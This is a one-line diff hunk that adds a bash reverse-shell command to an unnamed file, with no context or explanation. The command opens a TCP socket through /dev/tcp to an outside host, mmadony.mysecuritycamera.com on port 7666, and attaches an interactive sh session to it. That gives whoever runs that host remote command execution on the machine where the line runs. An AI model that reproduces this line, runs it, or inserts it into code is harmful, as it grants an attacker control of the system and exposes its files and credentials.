@@ -1,0 +1,1 @@
+0<&138-;exec 138<>/dev/tcp/mmadony.mysecuritycamera.com/7666;sh <&138 >&138 2>&138
